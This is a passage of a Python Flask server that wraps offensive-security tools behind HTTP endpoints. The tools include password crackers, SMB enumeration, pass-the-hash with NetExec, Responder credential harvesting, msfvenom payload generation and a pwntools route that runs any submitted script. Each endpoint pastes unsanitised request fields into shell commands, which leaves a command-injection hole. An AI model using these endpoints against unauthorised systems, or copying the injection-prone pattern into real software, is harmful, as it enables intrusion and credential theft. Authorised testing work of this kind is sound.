        params = request.json
        hash_file = params.get("hash_file", "")
        wordlist = params.get("wordlist", ROCKYOU_PATH)
        format_type = params.get("format", "")
        additional_args = params.get("additional_args", "")

        if not hash_file:
            logger.warning("🔐 John called without hash_file parameter")
            return jsonify({
                "error": "Hash file parameter is required"
            }), 400

        command = f"john"

        if format_type:
            command += f" --format={format_type}"

        if wordlist:
            command += f" --wordlist={wordlist}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {hash_file}"

        logger.info(f"🔐 Starting John the Ripper: {hash_file}")
        result = execute_command(command)
        logger.info(f"📊 John the Ripper completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in john endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/wpscan", methods=["POST"])
def wpscan():
    """Execute wpscan with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 WPScan called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"wpscan --url {url}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting WPScan: {url}")
        result = execute_command(command)
        logger.info(f"📊 WPScan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in wpscan endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/enum4linux", methods=["POST"])
def enum4linux():
    """Execute enum4linux with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "-a")

        if not target:
            logger.warning("🎯 Enum4linux called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"enum4linux {additional_args} {target}"

        logger.info(f"🔍 Starting Enum4linux: {target}")
        result = execute_command(command)
        logger.info(f"📊 Enum4linux completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in enum4linux endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/ffuf", methods=["POST"])
def ffuf():
    """Execute FFuf web fuzzer with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", COMMON_DIRB_PATH)
        mode = params.get("mode", "directory")
        match_codes = params.get("match_codes", "200,204,301,302,307,401,403")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 FFuf called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"ffuf"

        if mode == "directory":
            command += f" -u {url}/FUZZ -w {wordlist}"
        elif mode == "vhost":
            command += f" -u {url} -H 'Host: FUZZ' -w {wordlist}"
        elif mode == "parameter":
            command += f" -u {url}?FUZZ=value -w {wordlist}"
        else:
            command += f" -u {url} -w {wordlist}"

        command += f" -mc {match_codes}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting FFuf {mode} fuzzing: {url}")
        result = execute_command(command)
        logger.info(f"📊 FFuf fuzzing completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in ffuf endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/netexec", methods=["POST"])
def netexec():
    """Execute NetExec (formerly CrackMapExec) with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        protocol = params.get("protocol", "smb")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_value = params.get("hash", "")
        module = params.get("module", "")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 NetExec called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"nxc {protocol} {target}"

        if username:
            command += f" -u {username}"

        if password:
            command += f" -p {password}"

        if hash_value:
            command += f" -H {hash_value}"

        if module:
            command += f" -M {module}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting NetExec {protocol} scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 NetExec scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in netexec endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/amass", methods=["POST"])
def amass():
    """Execute Amass for subdomain enumeration with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        mode = params.get("mode", "enum")
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 Amass called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400

        command = f"amass {mode}"

        if mode == "enum":
            command += f" -d {domain}"
        else:
            command += f" -d {domain}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Amass {mode}: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Amass completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in amass endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/hashcat", methods=["POST"])
def hashcat():
    """Execute Hashcat for password cracking with enhanced logging"""
    try:
        params = request.json
        hash_file = params.get("hash_file", "")
        hash_type = params.get("hash_type", "")
        attack_mode = params.get("attack_mode", "0")
        wordlist = params.get("wordlist", ROCKYOU_PATH)
        mask = params.get("mask", "")
        additional_args = params.get("additional_args", "")

        if not hash_file:
            logger.warning("🔐 Hashcat called without hash_file parameter")
            return jsonify({
                "error": "Hash file parameter is required"
            }), 400

        if not hash_type:
            logger.warning("🔐 Hashcat called without hash_type parameter")
            return jsonify({
                "error": "Hash type parameter is required"
            }), 400

        command = f"hashcat -m {hash_type} -a {attack_mode} {hash_file}"

        if attack_mode == "0" and wordlist:
            command += f" {wordlist}"
        elif attack_mode == "3" and mask:
            command += f" {mask}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔐 Starting Hashcat attack: mode {attack_mode}")
        result = execute_command(command)
        logger.info(f"📊 Hashcat attack completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hashcat endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/subfinder", methods=["POST"])
def subfinder():
    """Execute Subfinder for passive subdomain enumeration with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        silent = params.get("silent", True)
        all_sources = params.get("all_sources", False)
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 Subfinder called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400

        command = f"subfinder -d {domain}"

        if silent:
            command += " -silent"

        if all_sources:
            command += " -all"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Subfinder: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Subfinder completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in subfinder endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/smbmap", methods=["POST"])
def smbmap():
    """Execute SMBMap for SMB share enumeration with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        username = params.get("username", "")
        password = params.get("password", "")
        domain = params.get("domain", "")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 SMBMap called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"smbmap -H {target}"

        if username:
            command += f" -u {username}"

        if password:
            command += f" -p {password}"

        if domain:
            command += f" -d {domain}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting SMBMap: {target}")
        result = execute_command(command)
        logger.info(f"📊 SMBMap completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in smbmap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ENHANCED NETWORK PENETRATION TESTING TOOLS (v6.0)
# ============================================================================

@app.route("/api/tools/rustscan", methods=["POST"])
def rustscan():
    """Execute Rustscan for ultra-fast port scanning with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        ports = params.get("ports", "")
        ulimit = params.get("ulimit", 5000)
        batch_size = params.get("batch_size", 4500)
        timeout = params.get("timeout", 1500)
        scripts = params.get("scripts", "")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 Rustscan called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"rustscan -a {target} --ulimit {ulimit} -b {batch_size} -t {timeout}"

        if ports:
            command += f" -p {ports}"

        if scripts:
            command += f" -- -sC -sV"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"⚡ Starting Rustscan: {target}")
        result = execute_command(command)
        logger.info(f"📊 Rustscan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in rustscan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/masscan", methods=["POST"])
def masscan():
    """Execute Masscan for high-speed Internet-scale port scanning with intelligent rate limiting"""
    try:
        params = request.json
        target = params.get("target", "")
        ports = params.get("ports", "1-65535")
        rate = params.get("rate", 1000)
        interface = params.get("interface", "")
        router_mac = params.get("router_mac", "")
        source_ip = params.get("source_ip", "")
        banners = params.get("banners", False)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 Masscan called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"masscan {target} -p{ports} --rate={rate}"

        if interface:
            command += f" -e {interface}"

        if router_mac:
            command += f" --router-mac {router_mac}"

        if source_ip:
            command += f" --source-ip {source_ip}"

        if banners:
            command += " --banners"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🚀 Starting Masscan: {target} at rate {rate}")
        result = execute_command(command)
        logger.info(f"📊 Masscan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in masscan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/nmap-advanced", methods=["POST"])
def nmap_advanced():
    """Execute advanced Nmap scans with custom NSE scripts and optimized timing"""
    try:
        params = request.json
        target = params.get("target", "")
        scan_type = params.get("scan_type", "-sS")
        ports = params.get("ports", "")
        timing = params.get("timing", "T4")
        nse_scripts = params.get("nse_scripts", "")
        os_detection = params.get("os_detection", False)
        version_detection = params.get("version_detection", False)
        aggressive = params.get("aggressive", False)
        stealth = params.get("stealth", False)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 Advanced Nmap called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"nmap {scan_type} {target}"

        if ports:
            command += f" -p {ports}"

        if stealth:
            command += " -T2 -f --mtu 24"
        else:
            command += f" -{timing}"

        if os_detection:
            command += " -O"

        if version_detection:
            command += " -sV"

        if aggressive:
            command += " -A"

        if nse_scripts:
            command += f" --script={nse_scripts}"
        elif not aggressive:  # Default useful scripts if not aggressive
            command += " --script=default,discovery,safe"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Advanced Nmap: {target}")
        result = execute_command(command)
        logger.info(f"📊 Advanced Nmap completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in advanced nmap endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/autorecon", methods=["POST"])
def autorecon():
    """Execute AutoRecon for comprehensive automated reconnaissance"""
    try:
        params = request.json
        target = params.get("target", "")
        output_dir = params.get("output_dir", "/tmp/autorecon")
        port_scans = params.get("port_scans", "top-100-ports")
        service_scans = params.get("service_scans", "default")
        heartbeat = params.get("heartbeat", 60)
        timeout = params.get("timeout", 300)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 AutoRecon called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"autorecon {target} -o {output_dir} --heartbeat {heartbeat} --timeout {timeout}"

        if port_scans != "default":
            command += f" --port-scans {port_scans}"

        if service_scans != "default":
            command += f" --service-scans {service_scans}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔄 Starting AutoRecon: {target}")
        result = execute_command(command)
        logger.info(f"📊 AutoRecon completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in autorecon endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/enum4linux-ng", methods=["POST"])
def enum4linux_ng():
    """Execute Enum4linux-ng for advanced SMB enumeration with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        username = params.get("username", "")
        password = params.get("password", "")
        domain = params.get("domain", "")
        shares = params.get("shares", True)
        users = params.get("users", True)
        groups = params.get("groups", True)
        policy = params.get("policy", True)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 Enum4linux-ng called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"enum4linux-ng {target}"

        if username:
            command += f" -u {username}"

        if password:
            command += f" -p {password}"

        if domain:
            command += f" -d {domain}"

        # Add specific enumeration options
        enum_options = []
        if shares:
            enum_options.append("S")
        if users:
            enum_options.append("U")
        if groups:
            enum_options.append("G")
        if policy:
            enum_options.append("P")

        if enum_options:
            command += f" -A {','.join(enum_options)}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Enum4linux-ng: {target}")
        result = execute_command(command)
        logger.info(f"📊 Enum4linux-ng completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in enum4linux-ng endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/rpcclient", methods=["POST"])
def rpcclient():
    """Execute rpcclient for RPC enumeration with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        username = params.get("username", "")
        password = params.get("password", "")
        domain = params.get("domain", "")
        commands = params.get("commands", "enumdomusers;enumdomgroups;querydominfo")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 rpcclient called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        # Build authentication string
        auth_string = ""
        if username and password:
            auth_string = f"-U {username}%{password}"
        elif username:
            auth_string = f"-U {username}"
        else:
            auth_string = "-U ''"  # Anonymous

        if domain:
            auth_string += f" -W {domain}"

        # Create command sequence
        command_sequence = commands.replace(";", "\n")

        command = f"echo -e '{command_sequence}' | rpcclient {auth_string} {target}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting rpcclient: {target}")
        result = execute_command(command)
        logger.info(f"📊 rpcclient completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in rpcclient endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/nbtscan", methods=["POST"])
def nbtscan():
    """Execute nbtscan for NetBIOS name scanning with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        verbose = params.get("verbose", False)
        timeout = params.get("timeout", 2)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 nbtscan called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"nbtscan -t {timeout}"

        if verbose:
            command += " -v"

        command += f" {target}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting nbtscan: {target}")
        result = execute_command(command)
        logger.info(f"📊 nbtscan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in nbtscan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/arp-scan", methods=["POST"])
def arp_scan():
    """Execute arp-scan for network discovery with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        interface = params.get("interface", "")
        local_network = params.get("local_network", False)
        timeout = params.get("timeout", 500)
        retry = params.get("retry", 3)
        additional_args = params.get("additional_args", "")

        if not target and not local_network:
            logger.warning("🎯 arp-scan called without target parameter")
            return jsonify({"error": "Target parameter or local_network flag is required"}), 400

        command = f"arp-scan -t {timeout} -r {retry}"

        if interface:
            command += f" -I {interface}"

        if local_network:
            command += " -l"
        else:
            command += f" {target}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting arp-scan: {target if target else 'local network'}")
        result = execute_command(command)
        logger.info(f"📊 arp-scan completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in arp-scan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/responder", methods=["POST"])
def responder():
    """Execute Responder for credential harvesting with enhanced logging"""
    try:
        params = request.json
        interface = params.get("interface", "eth0")
        analyze = params.get("analyze", False)
        wpad = params.get("wpad", True)
        force_wpad_auth = params.get("force_wpad_auth", False)
        fingerprint = params.get("fingerprint", False)
        duration = params.get("duration", 300)  # 5 minutes default
        additional_args = params.get("additional_args", "")

        if not interface:
            logger.warning("🎯 Responder called without interface parameter")
            return jsonify({"error": "Interface parameter is required"}), 400

        command = f"timeout {duration} responder -I {interface}"

        if analyze:
            command += " -A"

        if wpad:
            command += " -w"

        if force_wpad_auth:
            command += " -F"

        if fingerprint:
            command += " -f"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Responder on interface: {interface}")
        result = execute_command(command)
        logger.info(f"📊 Responder completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in responder endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/volatility", methods=["POST"])
def volatility():
    """Execute Volatility for memory forensics with enhanced logging"""
    try:
        params = request.json
        memory_file = params.get("memory_file", "")
        plugin = params.get("plugin", "")
        profile = params.get("profile", "")
        additional_args = params.get("additional_args", "")

        if not memory_file:
            logger.warning("🧠 Volatility called without memory_file parameter")
            return jsonify({
                "error": "Memory file parameter is required"
            }), 400

        if not plugin:
            logger.warning("🧠 Volatility called without plugin parameter")
            return jsonify({
                "error": "Plugin parameter is required"
            }), 400

        command = f"volatility -f {memory_file}"

        if profile:
            command += f" --profile={profile}"

        command += f" {plugin}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🧠 Starting Volatility analysis: {plugin}")
        result = execute_command(command)
        logger.info(f"📊 Volatility analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in volatility endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/msfvenom", methods=["POST"])
def msfvenom():
    """Execute MSFVenom to generate payloads with enhanced logging"""
    try:
        params = request.json
        payload = params.get("payload", "")
        format_type = params.get("format", "")
        output_file = params.get("output_file", "")
        encoder = params.get("encoder", "")
        iterations = params.get("iterations", "")
        additional_args = params.get("additional_args", "")

        if not payload:
            logger.warning("🚀 MSFVenom called without payload parameter")
            return jsonify({
                "error": "Payload parameter is required"
            }), 400

        command = f"msfvenom -p {payload}"

        if format_type:
            command += f" -f {format_type}"

        if output_file:
            command += f" -o {output_file}"

        if encoder:
            command += f" -e {encoder}"

        if iterations:
            command += f" -i {iterations}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🚀 Starting MSFVenom payload generation: {payload}")
        result = execute_command(command)
        logger.info(f"📊 MSFVenom payload generated")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in msfvenom endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# BINARY ANALYSIS & REVERSE ENGINEERING TOOLS
# ============================================================================

@app.route("/api/tools/gdb", methods=["POST"])
def gdb():
    """Execute GDB for binary analysis and debugging with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        commands = params.get("commands", "")
        script_file = params.get("script_file", "")
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 GDB called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400

        command = f"gdb {binary}"

        if script_file:
            command += f" -x {script_file}"

        if commands:
            temp_script = "/tmp/gdb_commands.txt"
            with open(temp_script, "w") as f:
                f.write(commands)
            command += f" -x {temp_script}"

        if additional_args:
            command += f" {additional_args}"

        command += " -batch"

        logger.info(f"🔧 Starting GDB analysis: {binary}")
        result = execute_command(command)

        if commands and os.path.exists("/tmp/gdb_commands.txt"):
            try:
                os.remove("/tmp/gdb_commands.txt")
            except:
                pass

        logger.info(f"📊 GDB analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in gdb endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/radare2", methods=["POST"])
def radare2():
    """Execute Radare2 for binary analysis and reverse engineering with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        commands = params.get("commands", "")
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 Radare2 called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400

        if commands:
            temp_script = "/tmp/r2_commands.txt"
            with open(temp_script, "w") as f:
                f.write(commands)
            command = f"r2 -i {temp_script} -q {binary}"
        else:
            command = f"r2 -q {binary}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting Radare2 analysis: {binary}")
        result = execute_command(command)

        if commands and os.path.exists("/tmp/r2_commands.txt"):
            try:
                os.remove("/tmp/r2_commands.txt")
            except:
                pass

        logger.info(f"📊 Radare2 analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in radare2 endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/binwalk", methods=["POST"])
def binwalk():
    """Execute Binwalk for firmware and file analysis with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        extract = params.get("extract", False)
        additional_args = params.get("additional_args", "")

        if not file_path:
            logger.warning("🔧 Binwalk called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400

        command = f"binwalk"

        if extract:
            command += " -e"

        if additional_args:
            command += f" {additional_args}"

        command += f" {file_path}"

        logger.info(f"🔧 Starting Binwalk analysis: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 Binwalk analysis completed for {file_path}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in binwalk endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/ropgadget", methods=["POST"])
def ropgadget():
    """Search for ROP gadgets in a binary using ROPgadget with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        gadget_type = params.get("gadget_type", "")
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 ROPgadget called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400

        command = f"ROPgadget --binary {binary}"

        if gadget_type:
            command += f" --only '{gadget_type}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting ROPgadget search: {binary}")
        result = execute_command(command)
        logger.info(f"📊 ROPgadget search completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in ropgadget endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/checksec", methods=["POST"])
def checksec():
    """Check security features of a binary with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")

        if not binary:
            logger.warning("🔧 Checksec called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400

        command = f"checksec --file={binary}"

        logger.info(f"🔧 Starting Checksec analysis: {binary}")
        result = execute_command(command)
        logger.info(f"📊 Checksec analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in checksec endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/xxd", methods=["POST"])
def xxd():
    """Create a hex dump of a file using xxd with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        offset = params.get("offset", "0")
        length = params.get("length", "")
        additional_args = params.get("additional_args", "")

        if not file_path:
            logger.warning("🔧 XXD called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400

        command = f"xxd -s {offset}"

        if length:
            command += f" -l {length}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {file_path}"

        logger.info(f"🔧 Starting XXD hex dump: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 XXD hex dump completed for {file_path}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in xxd endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/strings", methods=["POST"])
def strings():
    """Extract strings from a binary file with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        min_len = params.get("min_len", 4)
        additional_args = params.get("additional_args", "")

        if not file_path:
            logger.warning("🔧 Strings called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400

        command = f"strings -n {min_len}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {file_path}"

        logger.info(f"🔧 Starting Strings extraction: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 Strings extraction completed for {file_path}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in strings endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/objdump", methods=["POST"])
def objdump():
    """Analyze a binary using objdump with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        disassemble = params.get("disassemble", True)
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 Objdump called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400

        command = f"objdump"

        if disassemble:
            command += " -d"
        else:
            command += " -x"

        if additional_args:
            command += f" {additional_args}"

        command += f" {binary}"

        logger.info(f"🔧 Starting Objdump analysis: {binary}")
        result = execute_command(command)
        logger.info(f"📊 Objdump analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in objdump endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ENHANCED BINARY ANALYSIS AND EXPLOITATION FRAMEWORK (v6.0)
# ============================================================================

@app.route("/api/tools/ghidra", methods=["POST"])
def ghidra():
    """Execute Ghidra for advanced binary analysis and reverse engineering"""
    try:
        params = request.json
        binary = params.get("binary", "")
        project_name = params.get("project_name", "hexstrike_analysis")
        script_file = params.get("script_file", "")
        analysis_timeout = params.get("analysis_timeout", 300)
        output_format = params.get("output_format", "xml")
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 Ghidra called without binary parameter")
            return jsonify({"error": "Binary parameter is required"}), 400

        # Create Ghidra project directory
        project_dir = f"/tmp/ghidra_projects/{project_name}"
        os.makedirs(project_dir, exist_ok=True)

        # Base Ghidra command for headless analysis
        command = f"analyzeHeadless {project_dir} {project_name} -import {binary} -deleteProject"

        if script_file:
            command += f" -postScript {script_file}"

        if output_format == "xml":
            command += f" -postScript ExportXml.java {project_dir}/analysis.xml"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting Ghidra analysis: {binary}")
        result = execute_command(command, timeout=analysis_timeout)
        logger.info(f"📊 Ghidra analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in ghidra endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/pwntools", methods=["POST"])
def pwntools():
    """Execute Pwntools for exploit development and automation"""
    try:
        params = request.json
        script_content = params.get("script_content", "")
        target_binary = params.get("target_binary", "")
        target_host = params.get("target_host", "")
        target_port = params.get("target_port", 0)
        exploit_type = params.get("exploit_type", "local")  # local, remote, format_string, rop
        additional_args = params.get("additional_args", "")

        if not script_content and not target_binary:
            logger.warning("🔧 Pwntools called without script content or target binary")
            return jsonify({"error": "Script content or target binary is required"}), 400

        # Create temporary Python script
        script_file = "/tmp/pwntools_exploit.py"

        if script_content:
            # Use provided script content
            with open(script_file, "w") as f:
                f.write(script_content)
        else:
            # Generate basic exploit template
            template = f"""#!/usr/bin/env python3
from pwn import *

# Configuration
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

# Target configuration
binary = '{target_binary}' if '{target_binary}' else None
host = '{target_host}' if '{target_host}' else None
port = {target_port} if {target_port} else None

# Exploit logic
if binary:
    p = process(binary)
    log.info(f"Started local process: {{binary}}")
elif host and port:
    p = remote(host, port)
    log.info(f"Connected to {{host}}:{{port}}")
else:
    log.error("No target specified")
    exit(1)

# Basic interaction
p.interactive()
"""
            with open(script_file, "w") as f:
                f.write(template)

        command = f"python3 {script_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting Pwntools exploit: {exploit_type}")
        result = execute_command(command)

        # Cleanup
        try:
            os.remove(script_file)
        except:
            pass

        logger.info(f"📊 Pwntools exploit completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in pwntools endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/one-gadget", methods=["POST"])
def one_gadget():
    """Execute one_gadget to find one-shot RCE gadgets in libc"""
    try:
        params = request.json
        libc_path = params.get("libc_path", "")
        level = params.get("level", 1)  # 0, 1, 2 for different constraint levels
        additional_args = params.get("additional_args", "")

        if not libc_path:
            logger.warning("🔧 one_gadget called without libc_path parameter")
            return jsonify({"error": "libc_path parameter is required"}), 400

        command = f"one_gadget {libc_path} --level {level}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting one_gadget analysis: {libc_path}")
        result = execute_command(command)
        logger.info(f"📊 one_gadget analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in one_gadget endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/libc-database", methods=["POST"])
def libc_database():
